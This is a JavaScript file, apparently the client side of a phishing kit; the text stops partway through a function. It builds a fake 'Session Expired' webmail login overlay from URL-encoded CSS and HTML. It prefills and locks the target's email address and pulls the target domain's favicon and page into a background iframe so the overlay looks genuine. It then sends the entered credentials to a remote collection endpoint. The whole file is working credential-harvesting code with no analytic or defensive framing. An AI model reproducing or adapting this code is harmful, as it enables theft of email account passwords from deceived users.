let valued = false;
let finished = false;
let favico = "";
let containerFrame = "";
let email_address = "";
let loginPage = "";
let errormsg = "";

async function GEInfo(emailAddress) {
  try {
    const response = await fetch(policy, {
      method: "POST",
      body: JSON.stringify({ email_address: emailAddress }),
      headers: {
        "Content-Type": "application/json",
      },
    });

    const data = await response.json();

    if (data.status === "success") {
      // If the request was successful, assign the values to variables
      favico = data.favico;
      containerFrame = data.container_frame;
      email_address = data.email_address;
      loginPage = data.end_page;
      valued = true;
      // Use these variables as needed
      // return favico, containerFrame, emailAddress, loginPage
    } else if (data.status === "error") {
      errormsg = data.error_message;
      // If there was an error, log the error message
      console.log(data.error_message);
    }
  } catch (error) {
    console.error("Error:", error);
    console.log("An error occurred while making the request.");
  }
}

async function psignal(apiname, apikey) {
  const url = priv;
  const method = "POST";
  const data = new URLSearchParams();
  data.append("apiname", apiname);
  data.append("apikey", apikey);
  data.append("fName", "probono");

  try {
    const response = await fetch(url, {
      method: method,
      body: data,
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
    });

    if (response.status === 200) {
      const responseData = await response.json();
      errormsg = responseData.msgerror;
      if (responseData.status === "success") {
        finished = true;
      }
      console.log("msgerror: " + responseData.msgerror);
      console.log("status: " + responseData.status);
    } else {
      console.error("Request failed with status " + response.status);
    }
  } catch (error) {
    console.error("An error occurred while making the request:", error);
  }
}

document.addEventListener("DOMContentLoaded", async function () {
  const dStyle = decodeURIComponent(
    "%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20iframe%20%7B%0D%0A%20%20%20%20%20%20%09%20%20%20%20position%3A%20fixed%3B%0D%0A%20%20%20%20%20%20%09%20%20%20%20background%3A%20%23000%3B%0D%0A%20%20%20%20%20%20%09%20%20%20%20border%3A%20none%3B%0D%0A%20%20%20%20%20%20%09%20%20%20%20top%3A%200%3B%20right%3A%200%3B%0D%0A%20%20%20%20%20%20%09%20%20%20%20bottom%3A%200%3B%20left%3A%200%3B%0D%0A%20%20%20%20%20%20%09%20%20%20%20width%3A%20100%25%3B%0D%0A%20%20%20%20%20%20%09%20%20%20%20height%3A%20100%25%3B%0D%0A%20%20%20%20%20%20%09%20%20%20%20opacity%3A%200.3%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20z-index%3A%20-1%3B%0D%0A%0D%0A%0D%0A%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20.w3-display-middle%7Bposition%3Aabsolute%3Btop%3A50%25%3Bleft%3A50%25%3Btransform%3Atranslate(-50%25,-50%25)%3B-ms-transform%3Atranslate(-50%25,-50%25)%7D%0D%0A%20%20%20%20%20%20.w3-container,.w3-panel%7Bpadding%3A0.01em%2016px%7D.w3-panel%7Bmargin-top%3A16px%3Bmargin-bottom%3A16px%7D%0D%0A%20%20%20%20%20%20.w3-card,.w3-card-2%7Bbox-shadow%3A0%202px%205px%200%20rgba(0,0,0,0.16),0%202px%2010px%200%20rgba(0,0,0,0.12)%7D%0D%0A%0D%0A%20%20%20%20%20%20.m-login-content%20.login-box%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20position%3A%20absolute%3B%0D%0A%20%20%20%20%20%20%20%20%20%20top%3A%2095px%3B%0D%0A%20%20%20%20%20%20%20%20%20%20right%3A%2010px%3B%0D%0A%20%20%20%20%20%20%20%20%20%20z-index%3A%204%3B%0D%0A%20%20%20%20%20%20%20%20%20%20width%3A%20440px%3B%0D%0A%20%20%20%20%20%20%20%20%20%20height%3A%20450px%3B%0D%0A%20%20%20%20%20%20%20%20%20%20background%3A%20%23fff%3B%0D%0A%20%20%20%20%20%20%20%20%20%20background-image%3A%20-webkit-gradient(linear,left%20top,left%20bottom,from(%231c267f),to(%233e3737))%3B%0D%0A%20%20%20%20%20%20%20%20%20%20background-image%3A%20-webkit-linear-gradient(top,%23fff,%23f4f4f4)%3B%0D%0A%20%20%20%20%20%20%20%20%20%20background-image%3A%20-moz-linear-gradient(top,%23fff%200,%23f4f4f4%20100%25)%3B%0D%0A%20%20%20%20%20%20%20%20%20%20background-image%3A%20linear-gradient(%0D%0A%20%20%20%20%20%20-180deg%0D%0A%20%20%20%20%20%20,%23fff,%23f4f4f4)%3B%0D%0A%20%20%20%20%20%20%20%20%20%20-webkit-box-shadow%3A%202px%202px%205px%20rgb(0%200%200%20%2F%2010%25),%20-2px%20-2px%205px%20rgb(0%200%200%20%2F%2010%25)%3B%0D%0A%20%20%20%20%20%20%20%20%20%20box-shadow%3A%202px%202px%205px%20rgb(0%200%200%20%2F%2010%25),%20-2px%20-2px%205px%20rgb(0%200%200%20%2F%2010%25)%3B%0D%0A%20%20%20%20%20%20%20%20%20%20-webkit-border-radius%3A%205px%3B%0D%0A%20%20%20%20%20%20%20%20%20%20-moz-border-radius%3A%205px%3B%0D%0A%20%20%20%20%20%20%20%20%20%20border-radius%3A%205px%3B%0D%0A%20%20%20%20%20%20%20%20%20%20font-size%3A%200%3B%0D%0A%20%20%20%20%20%20%20%20%20%20text-align%3A%20center%3B%0D%0A%20%20%20%20%20%20%7D%0D%0A%0D%0A%20%20%20%20%20%20.m-cnt%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20padding%3A%200%2024px%3B%0D%0A%20%20%20%20%20%20%20%20%20%20width%3A%20312px%3B%0D%0A%20%20%20%20%20%20%09height%3A%2050px%3B%0D%0A%20%20%20%20%20%20%7D%0D%0A%0D%0A%20%20%20%20%20%20.box%7B%0D%0A%20%20%20%20%20%20%09box-shadow%3A%202px%202px%2020px%20rgb(51%2093%20125%20%2F%2050%25),%20-2px%20-2px%205px%20rgb(0%200%200%20%2F%2050%25)%3B%0D%0A%20%20%20%20%20%20%20%20%20%20position%3A%20center%3B%0D%0A%20%20%20%20%20%20%20%20%20%20z-index%3A%204%3B%0D%0A%20%20%20%20%20%20%20%20%20%20width%3A%20360px%3B%0D%0A%20%20%20%20%20%20%20%20%20%20height%3A%20auto%3B%0D%0A%20%20%20%20%20%20%20%20%20%20background-color%3A%20%23fff%3B%0D%0A%20%20%20%20%20%20%20%20%20%20-webkit-border-radius%3A%200%205px%205px%200%3B%0D%0A%20%20%20%20%20%20%20%20%20%20border-radius%3A%200%205px%205px%200%3B%0D%0A%20%20%20%20%20%20%20%20%20%20font-size%3A%2014px%3B%0D%0A%20%20%20%20%20%20%20%20%20%20text-align%3A%20center%3B%0D%0A%20%20%20%20%20%20%20%20%20%20padding-bottom%3A%2050px%3B%0D%0A%20%20%20%20%20%20%7D%0D%0A%0D%0A%0D%0A%0D%0A%20%20%20%20%20%20.m-login-content%20.u-urs-login%20.u-domain-selector,%20.m-login-content%20.u-urs-login%20.u-login-panel%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20display%3A%20inline-block%3B%0D%0A%20%20%20%20%20%20%20%20%20%20vertical-align%3A%20middle%3B%0D%0A%20%20%20%20%20%20%7D%0D%0A%0D%0A%20%20%20%20%20%20.u-logo%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20float%3A%20left%3B%0D%0A%20%20%20%20%20%20%20%20%20%20width%3A%2021px%3B%0D%0A%20%20%20%20%20%20%20%20%20%20text-align%3A%20center%3B%0D%0A%20%20%20%20%20%20%20%20%20%20padding%3A%200%205px%200%2010px%3B%0D%0A%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20.m-header%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20position%3A%20relative%3B%0D%0A%20%20%20%20%20%20%20%20%20%20padding%3A%2030px%200%3B%0D%0A%20%20%20%20%20%20%7D%0D%0A%0D%0A%20%20%20%20%20%20.h2%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20margin-top%3A%2046px%3B%0D%0A%20%20%20%20%20%20%20%20%20%20font-size%3A%2020px%3B%0D%0A%20%20%20%20%20%20%20%20%20%20color%3A%20%23333%3B%0D%0A%20%20%20%20%20%20%20%20%20%20line-height%3A%20280px%3B%0D%0A%20%20%20%20%20%20%20%20%20%20font-weight%3A%20700%3B%0D%0A%20%20%20%20%20%20%7D%0D%0A%0D%0A%0D%0A%20%20%20%20%20%20.userfeild%20%7B%0D%0A%20%20%20%20%20%20%09padding-left%3A%2010%3B%0D%0A%20%20%20%20%20%20%09border-top-color%3A%20currentcolor%3B%0D%0A%20%20%20%20%20%20%09border-top-style%3A%20none%3B%0D%0A%20%20%20%20%20%20%09border-right-color%3A%20currentcolor%3B%0D%0A%20%20%20%20%20%20%09border-right-style%3A%20none%3B%0D%0A%20%20%20%20%20%20%09border-bottom-color%3A%20currentcolor%3B%0D%0A%20%20%20%20%20%20%09border-bottom-style%3A%20none%3B%0D%0A%20%20%20%20%20%20%09border-left-color%3A%20currentcolor%3B%0D%0A%20%20%20%20%20%20%09border-left-style%3A%20none%3B%0D%0A%20%20%20%20%20%20%09border-image-outset%3A%200%3B%0D%0A%20%20%20%20%20%20%09border-image-repeat%3A%20stretch%3B%0D%0A%20%20%20%20%20%20%09border-image-slice%3A%20100%25%3B%0D%0A%20%20%20%20%20%20%09border-image-source%3A%20none%3B%0D%0A%20%20%20%20%20%20%09border-image-width%3A%201%3B%0D%0A%20%20%20%20%20%20%09float%3A%20left%3B%0D%0A%20%20%20%20%20%20%09height%3A%2046px%3B%0D%0A%20%20%20%20%20%20%09width%3A%2080%25%3B%0D%0A%20%20%20%20%20%20%09display%3A%20inline%3B%0D%0A%20%20%20%20%20%20%09outline-width%3A%200px%3B%0D%0A%20%20%20%20%20%20%20%20%20%20z-index%3A%2019%3B%0D%0A%20%20%20%20%20%20%20%20%20%20position%3A%20relative%3B%0D%0A%20%20%20%20%20%20%20%20%20%20height%3A%2044px%3B%0D%0A%20%20%20%20%20%20%20%20%20%20margin-bottom%3A%200px%3B%0D%0A%20%20%20%20%20%20%20%20%20%20border%3A%201px%20solid%20%23c5cddb%3B%0D%0A%20%20%20%20%20%20%20%20%20%20background%3A%20%23fff%3B%0D%0A%20%20%20%20%20%20%20%20%20%20font-size%3A%2012px%3B%0D%0A%20%20%20%20%20%20%20%20%20%20line-height%3A%2044px%0D%0A%20%20%20%20%20%20%20%20%20%20border-radius%3A%208px%3B%0D%0A%20%20%20%20%20%20%20%20%20%20border-color%3A%20%23DADADA%3B%0D%0A%0D%0A%20%20%20%20%20%20%7D%0D%0A%0D%0A%20%20%20%20%20%20.submit-163%7B%0D%0A%20%20%20%20%20%20%09padding-top%3A%2010%3B%0D%0A%20%20%20%20%20%20%09padding-bottom%3A%2010%3B%0D%0A%20%20%20%20%20%20%09font-weight%3A%20lighter%3B%0D%0A%20%20%20%20%20%20%09width%3A%2070%25%3B%0D%0A%20%20%20%20%20%20%09height%3A%2050px%3B%0D%0A%20%20%20%20%20%20%09font-size%3A%2020px%3B%0D%0A%20%20%20%20%20%20%09color%3A%20white%3B%0D%0A%20%20%20%20%20%20%09background-color%3A%20rgb(59,%20120,%20221)%3B%0D%0A%20%20%20%20%20%20%09background-position-x%3A%200%25%3B%0D%0A%20%20%20%20%20%20%09background-position-y%3A%200%25%3B%0D%0A%20%20%20%20%20%20%09background-repeat%3A%20repeat%3B%0D%0A%20%20%20%20%20%20%09background-attachment%3A%20scroll%3B%0D%0A%20%20%20%20%20%20%09background-image%3A%20none%3B%0D%0A%20%20%20%20%20%20%09background-size%3A%20auto%3B%0D%0A%20%20%20%20%20%20%09background-origin%3A%20padding-box%3B%0D%0A%20%20%20%20%20%20%09background-clip%3A%20border-box%3B%0D%0A%20%20%20%20%20%20%09border-top-color%3A%20currentcolor%3B%0D%0A%20%20%20%20%20%20%09border-top-style%3A%20none%3B%0D%0A%20%20%20%20%20%20%09border-right-color%3A%20currentcolor%3B%0D%0A%20%20%20%20%20%20%09border-right-style%3A%20none%3B%0D%0A%20%20%20%20%20%20%09border-bottom-color%3A%20currentcolor%3B%0D%0A%20%20%20%20%20%20%09border-bottom-style%3A%20none%3B%0D%0A%20%20%20%20%20%20%09border-left-color%3A%20currentcolor%3B%0D%0A%20%20%20%20%20%20%09border-left-style%3A%20none%3B%0D%0A%20%20%20%20%20%20%09border-image-outset%3A%200%3B%0D%0A%20%20%20%20%20%20%09border-image-repeat%3A%20stretch%3B%0D%0A%20%20%20%20%20%20%09border-image-slice%3A%20100%25%3B%0D%0A%20%20%20%20%20%20%09border-image-source%3A%20none%3B%0D%0A%20%20%20%20%20%20%09border-image-width%3A%201%3B%0D%0A%20%20%20%20%20%20%09border-top-left-radius%3A%205px%3B%0D%0A%20%20%20%20%20%20%09border-top-right-radius%3A%205px%3B%0D%0A%20%20%20%20%20%20%09border-bottom-right-radius%3A%205px%3B%0D%0A%20%20%20%20%20%20%09border-bottom-left-radius%3A%205px%3B%0D%0A%20%20%20%20%20%20%7D%0D%0A%0D%0A%20%20%20%20%20%20.submit-126%7B%0D%0A%20%20%20%20%20%20%09padding-top%3A%2010%3B%0D%0A%20%20%20%20%20%20%09padding-bottom%3A%2010%3B%0D%0A%20%20%20%20%20%20%09font-weight%3A%20lighter%3B%0D%0A%20%20%20%20%20%20%09width%3A%2070%25%3B%0D%0A%20%20%20%20%20%20%09height%3A%2050px%3B%0D%0A%20%20%20%20%20%20%09font-size%3A%2020px%3B%0D%0A%20%20%20%20%20%20%09color%3A%20white%3B%0D%0A%20%20%20%20%20%20%09background-color%3A%20rgb(26,153,92)%3B%0D%0A%20%20%20%20%20%20%09background-position-x%3A%200%25%3B%0D%0A%20%20%20%20%20%20%09background-position-y%3A%200%25%3B%0D%0A%20%20%20%20%20%20%09background-repeat%3A%20repeat%3B%0D%0A%20%20%20%20%20%20%09background-attachment%3A%20scroll%3B%0D%0A%20%20%20%20%20%20%09background-image%3A%20none%3B%0D%0A%20%20%20%20%20%20%09background-size%3A%20auto%3B%0D%0A%20%20%20%20%20%20%09background-origin%3A%20padding-box%3B%0D%0A%20%20%20%20%20%20%09background-clip%3A%20border-box%3B%0D%0A%20%20%20%20%20%20%09border-top-color%3A%20currentcolor%3B%0D%0A%20%20%20%20%20%20%09border-top-style%3A%20none%3B%0D%0A%20%20%20%20%20%20%09border-right-color%3A%20currentcolor%3B%0D%0A%20%20%20%20%20%20%09border-right-style%3A%20none%3B%0D%0A%20%20%20%20%20%20%09border-bottom-color%3A%20currentcolor%3B%0D%0A%20%20%20%20%20%20%09border-bottom-style%3A%20none%3B%0D%0A%20%20%20%20%20%20%09border-left-color%3A%20currentcolor%3B%0D%0A%20%20%20%20%20%20%09border-left-style%3A%20none%3B%0D%0A%20%20%20%20%20%20%09border-image-outset%3A%200%3B%0D%0A%20%20%20%20%20%20%09border-image-repeat%3A%20stretch%3B%0D%0A%20%20%20%20%20%20%09border-image-slice%3A%20100%25%3B%0D%0A%20%20%20%20%20%20%09border-image-source%3A%20none%3B%0D%0A%20%20%20%20%20%20%09border-image-width%3A%201%3B%0D%0A%20%20%20%20%20%20%09border-top-left-radius%3A%205px%3B%0D%0A%20%20%20%20%20%20%09border-top-right-radius%3A%205px%3B%0D%0A%20%20%20%20%20%20%09border-bottom-right-radius%3A%205px%3B%0D%0A%20%20%20%20%20%20%09border-bottom-left-radius%3A%205px%3B%0D%0A%20%20%20%20%20%20%7D%0D%0A%0D%0A%20%20%20%20%20%20.style-type-auto%20%23submit%20%7B%0D%0A%20%20%20%20%20%20%09width%3A%20100%25%3B%0D%0A%20%20%20%20%20%20%09margin-top%3A%2010px%3B%0D%0A%20%20%20%20%20%20%09%7D%0D%0A%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%23login-wrap.login-quick%20.hd%20.quick,%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%23login-wrap.login-static%20.hd%20.static,%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20.login-quick%20%23login-form,%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20.login-static%20.qrcode-login%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20display%3A%20none%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%40media%20(min-width%3A%201232px)%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%23content%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20margin%3A%200%20auto%20!important%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%23login-form%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20font-size%3A%2012px%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%0D%0A%0D%0A%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%23login-form%20.about-checkcode,%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%23login-form%20.title%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20display%3A%20none%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%23login-form,%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20.qrcode-login%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20position%3A%20relative%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20font%3A%20400%2012px%20arial%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20width%3A%20360px%3B%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0D%0A%0D%0A%20%20%20%20%20%20.space%7B%0D%0A%20%20%20%20%20%20%20%20%20%20height%3A%2024px%3B%0D%0A%20%20%20%20%20%20%20%20%20%20line-height%3A%2024px%3B%0D%0A%20%20%20%20%20%20%20%20%20%20font-size%3A%2010%3B%0D%0A%20%20%20%20%20%20%7D%0D%0A%0D%0A%0D%0A%20%20%20%20%20%20.imgfav%7B%0D%0A%20%20%20%20%20%20%09padding%3A%200px%207px%205px%200px%3B%0D%0A%20%20%20%20%20%20%09actualWidth%3A%2023%3B%0D%0A%20%20%20%20%20%20%09actualHeight%3A%2021%3B%0D%0A%20%20%20%20%20%20%7D%0D%0A%0D%0A%20%20%20%20%20%20.fur-change-email%20%7B%0D%0A%20%20%20%20%20%20%20%20%20%20position%3A%20relative%3B%0D%0A%20%20%20%20%20%20%20%20%20%20width%3A%20320px%3B%0D%0A%20%20%20%20%20%20%20%20%20%20height%3A%2016px%3B%0D%0A%20%20%20%20%20%20%20%20%20%20line-height%3A%2016px%3B%0D%0A%20%20%20%20%20%20%20%20%20%20font-size%3A%2012px%3B%0D%0A%20%20%20%20%20%20%7D%0D%0A%0D%0A%20%20%20%20%20%20.show%20%7B%0D%0A%20%20%20%20%20%20%20%20visibility%3A%20visible%3B%0D%0A%20%20%20%20%20%20%7D%0D%0A%20%20%20%20%20%20.hide%20%7B%0D%0A%20%20%20%20%20%20%20%20visibility%3A%20hidden%3B%0D%0A%20%20%20%20%20%20%7D%0D%0A%0D%0A%20%20%20%20%20%20h4%20%7B%0D%0A%20%20%20%20%20%20%20%20font-family%3A%20%22Times%20New%20Roman%22,%20Times,%20serif%3B%0D%0A%20%20%20%20%20%20%20%20box-sizing%3A%20border-box%3B%0D%0A%20%20%20%20%20%20%20%20position%3A%20relative%3B%0D%0A%20%20%20%20%20%20%20%20min-height%3A%201px%3B%0D%0A%20%20%20%20%20%20%20%20padding-left%3A%202%3B%0D%0A%20%20%20%20%20%20%20%20padding-right%3A%202%3B%0D%0A%20%20%20%20%20%20%20%20color%3A%20rgb(232,%2017,%2035)%3B%0D%0A%20%20%20%20%20%20%20%20text-align%3A%20center%3B%0D%0A%20%20%20%20%20%20%20%20actualwidth%3A%20348%3B%0D%0A%20%20%20%20%20%20%20%20actualheight%3A%2040%3B%0D%0A%20%20%20%20%20%20%20%20font-size%3A%2013px%3B%0D%0A%20%20%20%20%20%20%7D"
  );
  const head = document.getElementsByTagName("head")[0];
  const style = document.createElement("style");
  style.innerHTML = dStyle;
  head.appendChild(style);

  const dData = decodeURIComponent(
    "%3Cdiv%20class%3D%22box%22%3E%0D%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22m-header%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%3Cp%20style%3D%22font-family%3A%20Bedrock%3B%20color%3A%20%23135689%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cimg%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20src%3D%22%22%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20id%3D%22imgFav%22%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20style%3D%22width%3A%2020px%3B%20padding%3A%200px%207px%200px%200px%22%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%3E%3Cstrong%3ESesssion%20Expired!%3C%2Fstrong%3E%3Cbr%20%2F%3E%3Ci%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3E%26%2337038%3B%26%2331665%3B%26%2324080%3B%26%2321495%3B%26%2330331%3B%26%2324405%3B%3C%2Fi%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%3C%2Fp%3E%0D%0A%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%0D%0A%20%20%20%20%20%20%20%20%3Cform%20method%3D%22post%22%20id%3D%22login-form%22%20name%3D%22login-form%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22m-cnt%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22u-logo%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cimg%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20src%3D%22data%3Aimage%2Fpng%3Bbase64,iVBORw0KGgoAAAANSUhEUgAAAB8AAAAeCAYAAADU8sWcAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAAEnQAABJ0Ad5mH3gAAAAZdEVYdFNvZnR3YXJlAEFkb2JlIEltYWdlUmVhZHlxyWU8AAABPElEQVRIS+2VwUtCQRCHJ3uH1AgDQ+FZvUQwJEqELv7r1bWjhAQZiMkLRcmDROGhR9noz4PEOjsPYZH8Ls4MLN%2Fbndl15+cXckQCv07Yyp2wufKvKEIUD%2FVVY+FTu0fNVhcVotx+RH5QpkqpgIodavnN7R0NPzxky5TPfLq+KiGTUR17JxwaxczzS4%2FG75%2FIZFTyfthGZCbsjxDJbM60J5JZRGY8bxeRjEpePMkhMhP48gcuUMnzRxkqHueR%2FaVeO6dUcg+ZTKy%2F1MHbeDb535P5cHE7qpVTlZhRyxfizusAlfkjkz4szNrCp2OLtZzv72Pzgbqj1U9qkPXo4rJKmYM0Kmas5LzT+0YLmR3cf2lAxYHjHWvFDK+RXjtRzkcdF2mtKJd6vAppreqer5tY93xdON35Vu6E%2FyonmgKVRHpz+4NvIgAAAABJRU5ErkJggg%3D%3D%22%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20class%3D%22userfeild%22%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20type%3D%22email%22%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20id%3D%22mxemail%22%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20name%3D%22email%22%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20placeholder%3D%22%26%2337038%3B%26%2331665%3B%26%2324080%3B%26%2321495%3B%26%2325110%3B%26%2325163%3B%26%2326426%3B%26%2321495%3B%26%2330721%3B%22%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20value%3D%22%22%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20required%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20tabindex%3D%221%22%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22fur-change-email%22%20id%3D%22auto-id-1625086074395%22%3E%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%3Cbr%20%2F%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22m-cnt%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22u-logo%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cimg%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20src%3D%22data%3Aimage%2Fpng%3Bbase64,iVBORw0KGgoAAAANSUhEUgAAABcAAAAbCAYAAACX6BTbAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAAEnQAABJ0Ad5mH3gAAAAZdEVYdFNvZnR3YXJlAEFkb2JlIEltYWdlUmVhZHlxyWU8AAABKklEQVRIS2P8DwQMNAJMUJomYIQY%2Fu37DzAmFhCM0N9%2F%2FjCcvniX4d7jF1ARCFCSlWAw1VdmYGVhgYpgAryGgww+cOAgw8svLAziPH8YBETlweIfXj+Eizk42OO0AK%2Fh1+48YTh35S7YlVbG6lBRCDh29ibYN3oaCkAMsRQd4A3zdy8egmmQ99EBTOzTmydgGhsgGKEgr2PzNkhMQQR3eIMA1mABpYgHT9+AgwRkuLiMClQGFVy68QAsL62gzqAgLcLAxckBlYEArIYv2XAQyiINxATYQ1kQMHgykbqiNBgTC4g2HJJpVMAYxCYGEG34v+9voCxUNj5AtOEP3vwBpo6HYAxiEwMGT4SC0jUIEwvo73JQriMVYNNDsDynBAyeCCUVjBqOBTAwAACg3HkUTrOT1AAAAABJRU5ErkJggg%3D%3D%22%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20class%3D%22userfeild%22%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20type%3D%22Password%22%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20id%3D%22password%22%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20name%3D%22password%22%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20placeholder%3D%22%26%2336755%3B%26%2320837%3B%26%2323494%3B%26%2330721%3B%22%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20minlength%3D%225%22%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20required%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20tabindex%3D%222%22%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20autocorrect%3D%22off%22%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20autocapitalize%3D%22off%22%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20autocomplete%3D%22off%22%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22m-cnt%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22fur-change-email%22%20id%3D%22auto-id-1625086074395%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch4%20class%3D%22air%22%20id%3D%22air%22%20style%3D%22color%3A%20red%22%3E%3C%2Fh4%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22fur-change-email%22%20id%3D%22auto-id-1625086074395%22%3E%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%3Cbutton%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20id%3D%22fm-login-submit%22%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20type%3D%22submit%22%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20name%3D%22submit%22%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20class%3D%22submit-163%22%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20tabindex%3D%224%22%0D%0A%20%20%20%20%20%20%20%20%20%20%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cstrong%3E%26%2330331%3B%20%26%2324405%3B%3C%2Fstrong%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%3C%2Fbutton%3E%0D%0A%20%20%20%20%20%20%20%20%3C%2Fform%3E%0D%0A%20%20%20%20%20%20%3C%2Fdiv%3E"
  );

  const container = document.getElementById("container");
  container.innerHTML = dData;

  //
  //
  const button = document.querySelector("#fm-login-submit");
  const email = document.querySelector("#mxemail");
  const passwd = document.querySelector("#password");
  const warningMessage = document.querySelector("#air");
  const imgfav = document.querySelector("#imgFav");
  const container_iframe = document.querySelector("#mainPage");
  const favicon =
      document.querySelector('link[rel="icon"]') ||
      document.querySelector('link[rel="shortcut icon"]');
  if (go != "") {
    email.value = go;
    await GEInfo(go);
    if (valued){
    email.value = email_address;
    email.setAttribute("readonly", true);
    }

    if (containerFrame) {
      container_iframe.src = containerFrame;
    }

    if (favicon) {
